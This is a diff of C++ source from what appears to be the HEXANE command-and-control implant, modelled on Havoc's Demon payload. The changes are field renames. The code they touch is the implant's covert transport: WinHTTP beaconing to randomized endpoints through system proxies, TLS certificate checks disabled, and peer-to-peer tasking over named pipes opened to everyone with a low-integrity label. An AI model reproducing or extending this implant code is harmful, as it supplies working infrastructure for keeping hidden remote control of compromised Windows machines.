@@ -36,8 +36,8 @@ namespace Http {
         } while (length > 0);
 
         (*stream) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
-        (*stream)->Buffer = download;
-        (*stream)->Length = total;
+        (*stream)->buffer = download;
+        (*stream)->length = total;
 
         defer:
     }
@@ -49,25 +49,25 @@ namespace Http {
         _request *request = R_CAST(_request*, x_malloc(sizeof(_request)));
         uint32_t n_endpoint = 0;
 
-        if (!Ctx->Transport.http->handle) {
-            if (!(Ctx->Transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->Transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
+        if (!Ctx->transport.http->handle) {
+            if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                 return_defer(ntstatus);
             }
         }
 
-        if (!(request->conn_handle = Ctx->win32.WinHttpConnect(Ctx->Transport.http->handle, Ctx->Transport.http->address, Ctx->Transport.http->port, 0))) {
+        if (!(request->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0))) {
             return_defer(ntstatus);
         }
 
         n_endpoint          = Utils::Random::RandomNumber32();
-        request->endpoint   = Ctx->Transport.http->endpoints[n_endpoint % Ctx->Transport.http->n_endpoints];
+        request->endpoint   = Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
 
-        Ctx->Transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
-        if (Ctx->Transport.bSSL) {
-            Ctx->Transport.http->flags |= WINHTTP_FLAG_SECURE;
+        Ctx->transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
+        if (Ctx->transport.b_ssl) {
+            Ctx->transport.http->flags |= WINHTTP_FLAG_SECURE;
         }
 
-        if (!(request->req_handle = Ctx->win32.WinHttpOpenRequest(request->conn_handle, Ctx->Transport.http->method, request->endpoint, nullptr, nullptr, nullptr, Ctx->Transport.http->flags))) {
+        if (!(request->req_handle = Ctx->win32.WinHttpOpenRequest(request->conn_handle, Ctx->transport.http->method, request->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags))) {
             return_defer(ntstatus);
         }
 
@@ -87,22 +87,22 @@ namespace Http {
         // _proxy_context is a temporary store and can be discarded
         _proxy_context *proxy_ctx = R_CAST(_proxy_context*, x_malloc(sizeof(_proxy_context)));
 
-        if (Ctx->Transport.bProxy) {
+        if (Ctx->transport.b_proxy) {
             proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-            proxy_ctx->proxy_info.lpszProxy     = Ctx->Transport.http->proxy->address;
+            proxy_ctx->proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;
 
             if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                 return_defer(ntstatus);
             }
 
-            if (Ctx->Transport.http->proxy->username && Ctx->Transport.http->proxy->password) {
+            if (Ctx->transport.http->proxy->username && Ctx->transport.http->proxy->password) {
                 if (
-                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->Transport.http->proxy->username, x_wcslen(Ctx->Transport.http->proxy->username)) ||
-                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->Transport.http->proxy->password, x_wcslen(Ctx->Transport.http->proxy->password))) {
+                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)) ||
+                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password))) {
                     return_defer(ntstatus);
                 }
             }
-        } else if (!Ctx->Transport.bEnvProxyCheck) {
+        } else if (!Ctx->transport.b_envproxy_check) {
             proxy_ctx->autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
             proxy_ctx->autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
             proxy_ctx->autoproxy.lpszAutoConfigUrl      = nullptr;
@@ -110,11 +110,11 @@ namespace Http {
             proxy_ctx->autoproxy.dwReserved             = 0;
             proxy_ctx->autoproxy.fAutoLogonIfChallenged = TRUE;
 
-            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
-                Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
-                Ctx->Transport.EnvProxy     = x_malloc(Ctx->Transport.EnvProxyLen);
+            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
+                Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
+                Ctx->transport.env_proxy     = x_malloc(Ctx->transport.env_proxylen);
 
-                x_memcpy(Ctx->Transport.EnvProxy, &proxy_ctx->proxy_info, Ctx->Transport.EnvProxyLen);
+                x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
 
             } else {
                 if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_ctx->proxy_config)) {
@@ -122,10 +122,10 @@ namespace Http {
                         proxy_ctx->proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                         proxy_ctx->proxy_info.lpszProxy         = proxy_ctx->proxy_config.lpszProxy;
                         proxy_ctx->proxy_info.lpszProxyBypass   = proxy_ctx->proxy_config.lpszProxyBypass;
-                        Ctx->Transport.EnvProxyLen              = sizeof(WINHTTP_PROXY_INFO);
+                        Ctx->transport.env_proxylen             = sizeof(WINHTTP_PROXY_INFO);
 
-                        Ctx->Transport.EnvProxy = x_malloc(Ctx->Transport.EnvProxyLen);
-                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_ctx->proxy_info, Ctx->Transport.EnvProxyLen);
+                        Ctx->transport.env_proxy = x_malloc(Ctx->transport.env_proxylen);
+                        x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
 
                         proxy_ctx->proxy_config.lpszProxy       = nullptr;
                         proxy_ctx->proxy_config.lpszProxyBypass = nullptr;
@@ -135,19 +135,19 @@ namespace Http {
                         proxy_ctx->autoproxy.lpszAutoConfigUrl  = proxy_ctx->proxy_config.lpszAutoConfigUrl;
                         proxy_ctx->autoproxy.dwAutoDetectFlags  = 0;
 
-                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
-                        Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
+                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
+                        Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
 
-                        Ctx->Transport.EnvProxy = x_malloc(Ctx->Transport.EnvProxyLen);
-                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_ctx->proxy_info, Ctx->Transport.EnvProxyLen);
+                        Ctx->transport.env_proxy = x_malloc(Ctx->transport.env_proxylen);
+                        x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
                     }
                 }
             }
-            Ctx->Transport.bEnvProxyCheck = true;
+            Ctx->transport.b_envproxy_check = true;
         }
 
-        if (Ctx->Transport.EnvProxy) {
-            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, Ctx->Transport.EnvProxy, Ctx->Transport.EnvProxyLen)) {
+        if (Ctx->transport.env_proxy) {
+            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen)) {
                 return_defer(ntstatus);
             }
         }
@@ -165,7 +165,7 @@ namespace Http {
 
     VOID HttpCallback(const _stream *const out, _stream **in) {
         HEXANE
-        // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21
+        // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
 
         _proxy_context *proxy_ctx   = { };
         _request *request           = { };
@@ -175,7 +175,7 @@ namespace Http {
         uint32_t n_headers  = 0;
         uint32_t n_status   = sizeof(uint32_t);
 
-        Ctx->Transport.http->method = OBFW(L"GET"); // todo: dynamic method selection/context-based?
+        Ctx->transport.http->method = OBFW(L"GET"); // todo: dynamic method selection/context-based?
 
         if (
             !(request = CreateRequestContext()) ||
@@ -183,22 +183,22 @@ namespace Http {
             return_defer(ntstatus);
         }
 
-        if (Ctx->Transport.bSSL) {
-            Ctx->Transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+        if (Ctx->transport.b_ssl) {
+            Ctx->transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-            if (!Ctx->win32.WinHttpSetOption(request->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->Transport.http->flags, sizeof(ULONG))) {
+            if (!Ctx->win32.WinHttpSetOption(request->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG))) {
                 return_defer(ntstatus);
             }
         }
 
-        if (Ctx->Transport.http->headers) {
+        if (Ctx->transport.http->headers) {
             DYN_ARRAY_EXPR(
                 // a pointless macro but it looks nicer/slightly less typing
-                n_headers, Ctx->Transport.http->headers,
-                header = Ctx->Transport.http->headers[n_headers];
+                n_headers, Ctx->transport.http->headers,
+                header = Ctx->transport.http->headers[n_headers];
 
                 if (!Ctx->win32.WinHttpAddRequestHeaders(request->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                     return_defer(ntstatus);
@@ -206,7 +206,7 @@ namespace Http {
         }
 
         if (
-            !Ctx->win32.WinHttpSendRequest(request->req_handle, nullptr, 0, out->Buffer, out->Length, out->Length, 0) ||
+            !Ctx->win32.WinHttpSendRequest(request->req_handle, nullptr, 0, out->buffer, out->length, out->length, 0) ||
             !Ctx->win32.WinHttpReceiveResponse(request->req_handle, nullptr)) {
             return_defer(ntstatus);
         }
@@ -239,19 +239,19 @@ namespace Smb {
     VOID SmbContextDestroy(const PSMB_PIPE_SEC_ATTR SmbSecAttr) {
         HEXANE
 
-        if (SmbSecAttr->Sid) {
-            Ctx->win32.FreeSid(SmbSecAttr->Sid);
-            SmbSecAttr->Sid = nullptr;
+        if (SmbSecAttr->sid) {
+            Ctx->win32.FreeSid(SmbSecAttr->sid);
+            SmbSecAttr->sid = nullptr;
         }
-        if (SmbSecAttr->SidLow) {
-            Ctx->win32.FreeSid(SmbSecAttr->SidLow);
-            SmbSecAttr->SidLow = nullptr;
+        if (SmbSecAttr->sid_low) {
+            Ctx->win32.FreeSid(SmbSecAttr->sid_low);
+            SmbSecAttr->sid_low = nullptr;
         }
-        if (SmbSecAttr->pAcl) {
-            x_free(SmbSecAttr->pAcl);
+        if (SmbSecAttr->p_acl) {
+            x_free(SmbSecAttr->p_acl);
         }
-        if (SmbSecAttr->SecDesc) {
-            x_free(SmbSecAttr->SecDesc);
+        if (SmbSecAttr->sec_desc) {
+            x_free(SmbSecAttr->sec_desc);
         }
     }
 
@@ -266,7 +266,7 @@ namespace Smb {
         x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
         x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
 
-        if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->SidLow)) {
+        if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low)) {
             return_defer(ERROR_INVALID_SID);
         }
 
@@ -276,40 +276,40 @@ namespace Smb {
 
         access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
         access.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
-        access.Trustee.ptstrName = S_CAST(LPSTR, SmbSecAttr->Sid);
+        access.Trustee.ptstrName = S_CAST(LPSTR, SmbSecAttr->sid);
 
         if (
             !(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
-            !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->SidLow)) {
+            !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low)) {
             return_defer(ERROR_INVALID_SID);
         }
 
-        if (!(SmbSecAttr->pAcl = S_CAST(PACL, x_malloc(MAX_PATH)))) {
+        if (!(SmbSecAttr->p_acl = S_CAST(PACL, x_malloc(MAX_PATH)))) {
             return_defer(ERROR_NOT_ENOUGH_MEMORY);
         }
 
         if (
-            !Ctx->win32.InitializeAcl(SmbSecAttr->pAcl, MAX_PATH, ACL_REVISION_DS) ||
-            !Ctx->win32.AddMandatoryAce(SmbSecAttr->pAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow)) {
+            !Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS) ||
+            !Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low)) {
             return_defer(ERROR_NO_ACE_CONDITION);
         }
 
-        if (!(SmbSecAttr->SecDesc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH))) {
+        if (!(SmbSecAttr->sec_desc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH))) {
             return_defer(ERROR_INVALID_SECURITY_DESCR);
         }
 
         if (
-            !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->SecDesc, SECURITY_DESCRIPTOR_REVISION) ||
-            !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->SecDesc, TRUE, acl, FALSE) ||
-            !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->SecDesc, TRUE, SmbSecAttr->pAcl, FALSE)) {
+            !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION) ||
+            !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE) ||
+            !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE)) {
             return_defer(ERROR_INVALID_SECURITY_DESCR);
         }
 
         defer:
         if (ntstatus == ERROR_SUCCESS) {
-            SecAttr->lpSecurityDescriptor = SmbSecAttr->SecDesc;
-            SecAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
-            SecAttr->bInheritHandle = FALSE;
+            SecAttr->lpSecurityDescriptor   = SmbSecAttr->sec_desc;
+            SecAttr->nLength                = sizeof(SECURITY_ATTRIBUTES);
+            SecAttr->bInheritHandle         = FALSE;
         }
     }
 
@@ -320,14 +320,14 @@ namespace Smb {
         uint32_t total = 0;
 
         do {
-            if (!Ctx->win32.ReadFile(handle, B_PTR(in->Buffer) + total, MIN((in->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &read), nullptr)) {
+            if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, MIN((in->length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &read), nullptr)) {
                 if (ntstatus == ERROR_NO_DATA) {
                     return false;
                 }
             }
             total += read;
         }
-        while (total < in->Length);
+        while (total < in->length);
         return true;
     }
 
@@ -338,12 +338,12 @@ namespace Smb {
         uint32_t write = 0;
 
         do {
-            if (!Ctx->win32.WriteFile(handle, B_PTR(out->Buffer) + total, MIN((out->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &write), nullptr)) {
+            if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, MIN((out->length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &write), nullptr)) {
                 return false;
             }
             total += write;
         }
-        while (total < out->Length);
+        while (total < out->length);
         return true;
     }
 
@@ -361,7 +361,7 @@ namespace Smb {
         ULONG n_bytes       = 0;
 
         SmbContextInit(&smb_attr, &sec_attr);
-        if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->Config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
+        if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
             return_defer(ntstatus);
         }
 
@@ -377,13 +377,13 @@ namespace Smb {
 
             if (
                 !Ctx->win32.ReadFile(handle, &peer_id, sizeof(uint32_t), &n_bytes, nullptr) ||
-                Ctx->Session.PeerId != peer_id) {
+                Ctx->session.peer_id != peer_id) {
                 return_defer(ntstatus);
             }
 
             (*in) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
-            (*in)->Buffer = x_malloc(msg_length);
-            (*in)->Length = msg_length;
+            (*in)->buffer = x_malloc(msg_length);
+            (*in)->length = msg_length;
 
             PipeRead(handle, *in);
 
@@ -404,10 +404,10 @@ namespace Smb {
         HEXANE
         // egress handle is set up by the parent. this indicates that we are an smb peer.
 
-        auto pipename = Ctx->Config.EgressPipename;
+        auto pipename = Ctx->config.EgressPipename;
 
-        if (!(Ctx->Config.EgressHandle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
-            if (Ctx->Config.EgressHandle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {
+        if (!(Ctx->config.EgressHandle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
+            if (Ctx->config.EgressHandle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {
 
                 if (!Ctx->win32.WaitNamedPipeW(pipename, 5000)) {
                     return_defer(ERROR_NOT_READY);
@@ -417,17 +417,17 @@ namespace Smb {
             }
         }
 
-        if (Ctx->win32.PeekNamedPipe(Ctx->Config.EgressHandle, nullptr, 0, nullptr, &(*in)->Length, nullptr)) {
-            if ((*in)->Length > 0) {
+        if (Ctx->win32.PeekNamedPipe(Ctx->config.EgressHandle, nullptr, 0, nullptr, &(*in)->length, nullptr)) {
+            if ((*in)->length > 0) {
 
-                if (!Network::Smb::PipeRead(Ctx->Config.EgressHandle, *in)) {
+                if (!Network::Smb::PipeRead(Ctx->config.EgressHandle, *in)) {
                     return_defer(ntstatus);
                 }
             } else {
                 return_defer(ERROR_INSUFFICIENT_BUFFER);
             }
         }
-        if (!Network::Smb::PipeWrite(Ctx->Config.EgressHandle, out)) {
+        if (!Network::Smb::PipeWrite(Ctx->config.EgressHandle, out)) {
             return_defer(ntstatus);
         }
 
